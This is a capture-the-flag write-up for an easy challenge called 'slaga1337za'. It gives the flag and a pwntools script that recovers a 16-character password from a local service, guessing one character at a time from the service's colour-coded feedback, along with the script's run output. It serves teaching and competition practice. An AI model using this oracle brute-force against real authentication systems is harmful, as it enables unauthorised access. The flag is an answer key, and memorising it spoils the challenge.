# slaga1337za

**Author** : Dušan Lazić

**Difficulty** : Easy

**Description** : "Slaga1337za" is quite similar to a well-known TV show that has been airing since 1993. Well, our version has been running since January 1st 1970! Try to guess the correct password before the time runs out.

**Flag** : `SCC{tr3f_k4r0_tr3f_pWn}`

# Solution

Leak the password by bruteforcing it character by character. Optional step is to leak the alphabet first to make bruteforcing faster.

```python
from pwn import *
import string

alphabet = string.ascii_lowercase
secret = ""
conn = remote("127.0.0.1", 3735)


def secret_found(secret):
    """
    Check if the whole secret matches the secret.
    """
    return len(secret) == 16


def characters_match(candidate):
    """
    Check if the given characters match the beginning of the secret.
    """
    conn.recvuntil(b"Password: ")
    conn.sendline(candidate.encode())
    response = conn.recvline().decode()
    return response[len(candidate) - 1] == "🔴"


# Find characters that appear in the password. This step is optional and makes the search faster.

min_alphabet = ""
for c in alphabet:
    conn.recvuntil(b"Password: ")
    conn.sendline(c.encode())
    response = conn.recvline().decode()
    if response[0] != "⚫":
        min_alphabet += c
        info(min_alphabet)
success(min_alphabet)

# Brute force the secret character by character.

while not secret_found(secret):
    for c in min_alphabet:
        candidate = secret + c
        if characters_match(candidate):
            secret = candidate
            info(secret)
            break
    else:
        warn(
            "Could not find the next character. It is either not in the alphabet or it does not exist in the secret."
        )
        break

# If found, submit the secret.

if secret_found(secret):
    conn.sendline(secret.encode())
    success(conn.recvall().decode())
else:
    conn.close()
```

```
$ python solve.py 
[+] Opening connection to 127.0.0.1 on port 3735: Done
[*] b
[*] bc
[*] bcd
[*] bcdh
[*] bcdhi
[*] bcdhim
[*] bcdhimp
[*] bcdhimps
[*] bcdhimpsy
[*] bcdhimpsyz
[+] bcdhimpsyz
[*] c
[*] cp
[*] cpp
[*] cpps
[*] cppsy
[*] cppsyh
[*] cppsyhm
[*] cppsyhms
[*] cppsyhmsz
[*] cppsyhmszc
[*] cppsyhmszcd
[*] cppsyhmszcdb
[*] cppsyhmszcdbi
[*] cppsyhmszcdbib
[*] cppsyhmszcdbiby
[*] cppsyhmszcdbibyh
[+] Receiving all data: Done (35B)
[*] Closed connection to 127.0.0.1 port 3735
[+] SCC{tr3f_k4r0_tr3f_pWn}
```
